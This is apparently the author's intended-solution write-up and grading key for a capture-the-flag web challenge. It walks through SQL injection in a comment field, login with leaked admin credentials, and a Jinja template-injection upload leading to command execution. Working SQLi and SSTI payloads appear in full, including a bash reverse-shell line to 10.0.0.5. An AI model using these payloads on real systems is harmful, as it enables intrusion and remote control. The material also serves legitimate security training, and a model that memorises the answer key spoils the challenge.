# Stielvoll — Intended Solution (Stage 1)

Author reference. Three chained vulnerabilities: SQLi → admin login →
insecure upload + SSTI → RCE → user flag.

---

## Step 1 — SQL injection in the comment field

Open any project post, e.g. `/projekte/poolbau-mit-holzdeck`, scroll to
**Kommentar schreiben**. The comment is stored with an unparameterised
`INSERT` (f-string). SQLite string concatenation (`||`) lets you turn the
stored comment text into data pulled from another table.

**Payload in the "Kommentar" field** (any name works):

```
' || (SELECT username || ':' || password FROM users) || '
```

Submit. The new comment renders as:

```
tom-admin:@ndAouGot1t!
```

Variations players might use:

```
' || (SELECT group_concat(username||':'||password,' | ') FROM users) || '
' || (SELECT sql FROM sqlite_master WHERE type='table') || '      -- schema
```

Verbose DB errors are shown on purpose to help tune payloads.

> Why it works: `VALUES ('slug','<name>','<text>','<ts>')` is built by string
> interpolation. `'<text>'` becomes `'' || (SELECT …) || ''`, which SQLite
> evaluates to the subquery result before storing it.

---

## Step 2 — Admin login

Go to `/admin` (linked as *Administration* in the footer). Log in with the
leaked credentials:

```
Benutzername: tom-admin
Passwort:     @ndAouGot1t!
```

(The login query itself is parameterised — you are meant to *have* the creds,
not bypass the form.)

---

## Step 3 — Insecure upload + SSTI → RCE

In the admin dashboard, "Blogbeitrag erstellen" has a **Titelbild** file
upload with no type/content validation. When a post is opened, the uploaded
file's bytes are passed through `render_template_string` — so upload a file
whose contents are a Jinja Server-Side Template Injection payload.

Create a file `exploit.png` containing:

```jinja
{{ cycler.__init__.__globals__.os.popen('cat /home/analyst/user.txt').read() }}
```

Fill in a title + text, attach `exploit.png`, publish. Then open the post
(`/blog/<id>`, also listed on `/projekte`). The widget output area prints the
command result — the **user flag**.

Interactive / reverse shell variant:

```jinja
{{ cycler.__init__.__globals__.os.popen('id; uname -a').read() }}
```

```jinja
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"').read() }}
```

Because the app is meant to run **as `analyst`**, the shell lands as the
foothold user.

---

## Step 4 — Flag & pivot

```
cat /home/analyst/user.txt     # → user flag
```

From the `analyst` foothold, local privilege-escalation to the root/second
flag (`/root/root.txt`) is "out of scope of this webpage" and up to the
challenge design (sudo misconfig, SUID, cron, etc.).

---

## The three planted bugs (for grading)

| # | Vulnerability            | Location in `app.py`                     |
|---|--------------------------|------------------------------------------|
| 1 | SQL injection            | `projects_detail` — f-string `INSERT`    |
| 2 | Insecure file upload     | `admin_dashboard` — no upload validation |
| 3 | SSTI → RCE               | `blog_post` — `render_template_string`   |
